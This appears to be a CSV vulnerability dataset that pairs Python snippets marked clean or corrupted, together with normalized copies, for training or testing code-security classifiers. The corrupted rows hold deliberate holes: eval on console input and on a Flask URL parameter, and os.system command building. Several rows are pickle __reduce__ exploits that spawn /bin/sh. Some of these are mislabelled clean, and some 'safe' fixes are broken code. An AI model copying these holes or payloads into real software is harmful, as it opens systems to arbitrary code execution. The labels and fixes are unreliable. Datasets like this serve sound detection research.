rawCode,normalizedCode,label,source
"import pickle
import subprocess

class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    return malicious

def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)

malicious_payload = serialize_exploit()
deserialize_exploit(malicious_payload)","import pickle
import subprocess

class RunBinSh(VAR_9008):

    def __reduce__(VAR_198):
        return (VAR_9009.Popen, (['/bin/sh'],))

def serialize_exploit():
    VAR_9010 = VAR_9011.dumps(VAR_9012(), protocol=0)
    return VAR_9013

def deserialize_exploit(VAR_4154):
    VAR_9014.loads(VAR_9015)
VAR_9016 = VAR_9017()
VAR_9018(VAR_9019)",0,huggingface_cybernative_1673_clean
"import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious

def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)

malicious_payload = serialize_exploit()
deserialize_exploit(malicious_payload)","import pickle
import os

class RunBinSh(VAR_9020):

    def __reduce__(VAR_198):
        return (VAR_9021.system, ('/bin/sh',))

def serialize_exploit():
    VAR_9022 = VAR_9023.dumps(VAR_9024())
    return VAR_9025

def deserialize_exploit(VAR_4154):
    VAR_9026.loads(VAR_9027)
VAR_9028 = VAR_9029()
VAR_9030(VAR_9031)",1,huggingface_cybernative_1673_corrupted
"import ast
import operator as op

# Define allowed operations
allowed_operations = {
    '+': op.add,
    '-': op.sub,
    '*': op.mul,
    '/': op.truediv,
}

def get_user_input():
    return input(""Enter your command: "")

def parse_command(command):
    tree = ast.parse(command, mode='eval')  # Parse the user input into an AST
    
    if len(tree.body.args) != 2:  # Check if the user input has exactly two arguments
        raise ValueError('Invalid command')

    left = tree.body.args[0].n
    right = tree.body.args[1].n
    op = allowed_operations[tree.body.op]  # Get the operation from the allowed operations

    return op(left, right)  # Perform the operation

while True:
    try:
        command = get_user_input()
        result = parse_command(command)
        print(result)
    except Exception as e:
        print(f""An error occurred: {e}"")","import ast
import operator as op
VAR_9032 = {'+': VAR_9033.add, '-': VAR_9034.sub, '*': VAR_9035.mul, '/': VAR_9036.truediv}

def get_user_input():
    return VAR_9037('Enter your command: ')

def parse_command(VAR_807):
    VAR_9038 = VAR_9039.parse(VAR_9040, mode='eval')
    if VAR_9041(VAR_9042.body.args) != 2:
        raise VAR_9043('Invalid command')
    VAR_9044 = VAR_9045.body.args[0].n
    VAR_9046 = VAR_9047.body.args[1].n
    VAR_9048 = VAR_9049[VAR_9050.body.op]
    return VAR_9051(VAR_9052, VAR_9053)
while True:
    try:
        VAR_9054 = VAR_9055()
        VAR_9056 = VAR_9057(VAR_9058)
        VAR_9059(VAR_9060)
    except VAR_9061 as e:
        VAR_9062(f'An error occurred: {VAR_9063}')",0,huggingface_cybernative_1677_clean
"import os
def get_user_input():
    return input(""Enter your command: "")

def execute_command(command):
    eval(command)

while True:
    command = get_user_input()
    execute_command(command)","import os

def get_user_input():
    return VAR_9064('Enter your command: ')

def execute_command(VAR_807):
    VAR_9065(VAR_9066)
while True:
    VAR_9067 = VAR_9068()
    VAR_9069(VAR_9070)",1,huggingface_cybernative_1677_corrupted
"import pickle
import os
import subprocess

class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)

def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])

serialize_exploit()
deserialize_exploit()","import pickle
import os
import subprocess

class RunBinSh(VAR_9071):

    def __reduce__(VAR_198):
        return (VAR_9072.Popen, (['/bin/sh'],))

def serialize_exploit():
    VAR_9073 = VAR_9074.dumps(VAR_9075(), protocol=0)
    with VAR_9076('payload.dat', 'wb') as VAR_9077:
        VAR_9078.dump(VAR_9079, VAR_9080)

def deserialize_exploit():
    with VAR_9081('payload.dat', 'rb') as VAR_9082:
        VAR_9083 = VAR_9084.load(VAR_9085)
        VAR_9086.Popen(['/bin/sh'])
VAR_9087()
VAR_9088()",0,huggingface_cybernative_1683_clean
"import ast
import operator as op

# supported operators
operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
            ast.Div: op.truediv, ast.USub: op.neg}

def evaluate_expr(node):
    if isinstance(node, ast.Num): # <number>
        return node.n
    elif isinstance(node, ast.BinOp): # <left> <operator> <right>
        return operators[type(node.op)](evaluate_expr(node.left), evaluate_expr(node.right))
    elif isinstance(node, ast.UnaryOp): # <operator> <operand>
        return operators[type(node.op)](evaluate_expr(node.operand))
    else:
        raise TypeError(node)

def evaluate_input(user_input):
    try:
        tree = ast.parse(user_input, mode='eval')  # parse user input
        return evaluate_expr(tree.body)  # evaluate parsed user input
    except Exception as e:
        print('Invalid input:', e)

user_input = input(""Enter a mathematical expression: "")
print(evaluate_input(user_input))","import ast
import operator as op
VAR_9089 = {VAR_9090.Add: VAR_9095.add, VAR_9091.Sub: VAR_9096.sub, VAR_9092.Mult: VAR_9097.mul, VAR_9093.Div: VAR_9098.truediv, VAR_9094.USub: VAR_9099.neg}

def evaluate_expr(VAR_199):
    if VAR_9100(VAR_9101, VAR_9102.Num):
        return VAR_9103.n
    elif VAR_9104(VAR_9105, VAR_9106.BinOp):
        return VAR_9107[VAR_9108(VAR_9109.op)](VAR_9110(VAR_9111.left), VAR_9112(VAR_9113.right))
    elif VAR_9114(VAR_9115, VAR_9116.UnaryOp):
        return VAR_9117[VAR_9118(VAR_9119.op)](VAR_9120(VAR_9121.operand))
    else:
        raise VAR_9122(VAR_9123)

def evaluate_input(VAR_166):
    try:
        VAR_9124 = VAR_9125.parse(VAR_9126, mode='eval')
        return VAR_9127(VAR_9128.body)
    except VAR_9129 as e:
        VAR_9130('Invalid input:', VAR_9131)
VAR_9132 = VAR_9133('Enter a mathematical expression: ')
VAR_9134(VAR_9135(VAR_9136))",0,huggingface_cybernative_1688_clean
"import os
def evaluate_input(user_input):
    return eval(user_input)

user_input = input(""Enter a command: "")
evaluate_input(user_input)","import os

def evaluate_input(VAR_166):
    return VAR_9137(VAR_9138)
VAR_9139 = VAR_9140('Enter a command: ')
VAR_9141(VAR_9142)",1,huggingface_cybernative_1688_corrupted
"# Import required module
import ast
import operator as op

# Define allowed operations
operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
             ast.Div: op.truediv, ast.USub: op.neg}

# Define a function to evaluate the expression
def calculate_expression(node):
    if isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):  
        return operations[type(node.op)](calculate_expression(node.left), calculate_expression(node.right))
    elif isinstance(node, ast.UnaryOp): 
        return operations[type(node.op)](calculate_expression(node.operand))
    else:
        raise TypeError(node)

# Get user input
user_input = input(""Enter an expression: "")

# Parse the user input into an abstract syntax tree
tree = ast.parse(user_input, mode='eval')

# Calculate expression
result = calculate_expression(tree.body)

# Print result
print(""The result is: "", result)","import ast
import operator as op
VAR_9143 = {VAR_9144.Add: VAR_9149.add, VAR_9145.Sub: VAR_9150.sub, VAR_9146.Mult: VAR_9151.mul, VAR_9147.Div: VAR_9152.truediv, VAR_9148.USub: VAR_9153.neg}

def calculate_expression(VAR_199):
    if VAR_9154(VAR_9155, VAR_9156.Num):
        return VAR_9157.n
    elif VAR_9158(VAR_9159, VAR_9160.BinOp):
        return VAR_9161[VAR_9162(VAR_9163.op)](VAR_9164(VAR_9165.left), VAR_9166(VAR_9167.right))
    elif VAR_9168(VAR_9169, VAR_9170.UnaryOp):
        return VAR_9171[VAR_9172(VAR_9173.op)](VAR_9174(VAR_9175.operand))
    else:
        raise VAR_9176(VAR_9177)
VAR_9178 = VAR_9179('Enter an expression: ')
VAR_9180 = VAR_9181.parse(VAR_9182, mode='eval')
VAR_9183 = VAR_9184(VAR_9185.body)
VAR_9186('The result is: ', VAR_9187)",0,huggingface_cybernative_1694_clean
"# Import required module
import time

# Define a function
def calculate_expression(user_input):
    # Use eval() function to evaluate user input
    result = eval(user_input)
    return result

# Get user input
user_input = input(""Enter an expression: "")

# Calculate expression
result = calculate_expression(user_input)

# Print result
print(""The result is: "", result)","import time

def calculate_expression(VAR_166):
    VAR_9188 = VAR_9189(VAR_9190)
    return VAR_9191
VAR_9192 = VAR_9193('Enter an expression: ')
VAR_9194 = VAR_9195(VAR_9196)
VAR_9197('The result is: ', VAR_9198)",1,huggingface_cybernative_1694_corrupted
"from flask import Flask, request
import ast

app = Flask(__name__)

@app.route('/')
def index():
    command = request.args.get('command', '')
    if command:
        # Use ast.literal_eval instead of eval. It parses an expression node.
        # ast.literal_eval raises ValueError for invalid syntax and SyntaxError for illegal
        # constructs. This makes it safe to use for evaluating user input.
        try:
            ast.literal_eval(command)
        except (ValueError, SyntaxError):
            return ""Invalid command"", 400
    return ""Command executed successfully""

if __name__ == '__main__':
    app.run(debug=True)","from flask import Flask, request
import ast
VAR_9199 = VAR_9200(VAR_9201)

@VAR_9209.route('/')
def index():
    VAR_9202 = VAR_9203.args.get('command', '')
    if VAR_9204:
        try:
            VAR_9205.literal_eval(VAR_9206)
        except (VAR_9207, VAR_9208):
            return ('Invalid command', 400)
    return 'Command executed successfully'
if VAR_9210 == '__main__':
    VAR_9211.run(debug=True)",0,huggingface_cybernative_1699_clean
"from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    command = request.args.get('command', '')
    eval(command)

if __name__ == '__main__':
    app.run(debug=True)","from flask import Flask, request
VAR_9212 = VAR_9213(VAR_9214)

@VAR_9219.route('/')
def index():
    VAR_9215 = VAR_9216.args.get('command', '')
    VAR_9217(VAR_9218)
if VAR_9220 == '__main__':
    VAR_9221.run(debug=True)",1,huggingface_cybernative_1699_corrupted
"# Importing necessary libraries
import ast
import sys

def safe_eval(user_input):
    # List of allowed operations
    allowed_operations = {ast.Expression, ast.Call, ast.Name, ast.Load}

    if not user_input:
        raise ValueError('Empty expression')

    # Parse user's input into an abstract syntax tree
    tree = ast.parse(user_input, mode='eval')
    for node in ast.walk(tree):
        if type(node) not in allowed_operations:
            raise ValueError(f'Unsupported operation: {type(node)}')

    # Evaluate the parsed tree
    codeobj = compile(tree, '<eval>', mode='eval')
    return eval(codeobj)

def execute_user_input():
    # Getting user input
    user_input = input(""Enter your command: "")
    
    # Safe usage of eval()
    try:
        result = safe_eval(user_input)
        print(result)
    except Exception as e:
        print(f""Invalid input: {e}"")

if __name__ == ""__main__"":
    execute_user_input()","import ast
import sys

def safe_eval(VAR_166):
    VAR_9222 = {VAR_9223.Expression, VAR_9224.Call, VAR_9225.Name, VAR_9226.Load}
    if not VAR_9227:
        raise VAR_9228('Empty expression')
    VAR_9229 = VAR_9230.parse(VAR_9231, mode='eval')
    for VAR_9232 in VAR_9233.walk(VAR_9234):
        if VAR_9235(VAR_9236) not in VAR_9237:
            raise VAR_9238(f'Unsupported operation: {VAR_9239(VAR_9240)}')
    VAR_9241 = VAR_9242(VAR_9243, '<eval>', mode='eval')
    return VAR_9244(VAR_9245)

def execute_user_input():
    VAR_9246 = VAR_9247('Enter your command: ')
    try:
        VAR_9248 = VAR_9249(VAR_9250)
        VAR_9251(VAR_9252)
    except VAR_9253 as e:
        VAR_9254(f'Invalid input: {VAR_9255}')
if VAR_9256 == '__main__':
    VAR_9257()",0,huggingface_cybernative_1705_clean
"# Importing necessary libraries
import os
import sys

def execute_user_input():
    # Getting user input
    user_input = input(""Enter your command: "")
    
    # Unsafe usage of eval()
    eval(user_input)

if __name__ == ""__main__"":
    execute_user_input()","import os
import sys

def execute_user_input():
    VAR_9258 = VAR_9259('Enter your command: ')
    VAR_9260(VAR_9261)
if VAR_9262 == '__main__':
    VAR_9263()",1,huggingface_cybernative_1705_corrupted
"import os
import shlex

def run_command(user_input):
    command = ""ls {}"".format(shlex.quote(user_input))
    os.system(command)

def run_command_vulnerable(user_input):
    if not user_input.isalpha():  # This will prevent execution of any command that contains non-alphabetical characters
        command = ""ls {}"".format(shlex.quote(user_input))
        os.system(command)

run_command(""-l"")
run_command_vulnerable('""-l""')","import os
import shlex

def run_command(VAR_166):
    VAR_9264 = 'ls {}'.format(VAR_9265.quote(VAR_9266))
    VAR_9267.system(VAR_9268)

def run_command_vulnerable(VAR_166):
    if not VAR_9269.isalpha():
        VAR_9270 = 'ls {}'.format(VAR_9271.quote(VAR_9272))
        VAR_9273.system(VAR_9274)
VAR_9275('-l')
VAR_9276('""-l""')",0,huggingface_cybernative_1709_clean
"import os

def run_command(user_input):
    command = ""ls {}"".format(user_input)
    os.system(command)

def run_command_vulnerable(user_input):
    command = ""ls {}"".format(eval(user_input))
    os.system(command)

run_command(""-l"")
run_command_vulnerable('""-l""')","import os

def run_command(VAR_166):
    VAR_9277 = 'ls {}'.format(VAR_9278)
    VAR_9279.system(VAR_9280)

def run_command_vulnerable(VAR_166):
    VAR_9281 = 'ls {}'.format(VAR_9282(VAR_9283))
    VAR_9284.system(VAR_9285)
VAR_9286('-l')
VAR_9287('""-l""')",1,huggingface_cybernative_1709_corrupted
"import pickle
import subprocess

class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'

    def __reduce__(self):
        return (subprocess.Popen, (self.command,))

data = pickle.dumps(SafeClass())
pickle.loads(data)","import pickle
import subprocess

class SafeClass:

    def __init__(VAR_198):
        VAR_9288.command = 'echo ""You have been hacked""'

    def __reduce__(VAR_198):
        return (VAR_9289.Popen, (VAR_9290.command,))
VAR_9291 = VAR_9292.dumps(VAR_9293())
VAR_9294.loads(VAR_9295)",0,huggingface_cybernative_1714_clean
"import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))

data = pickle.dumps(VulnerableClass())
pickle.loads(data)","import pickle
import os

class VulnerableClass:

    def __reduce__(VAR_198):
        return (VAR_9296.system, ('echo ""You have been hacked""',))
VAR_9297 = VAR_9298.dumps(VAR_9299())
VAR_9300.loads(VAR_9301)",1,huggingface_cybernative_1714_corrupted
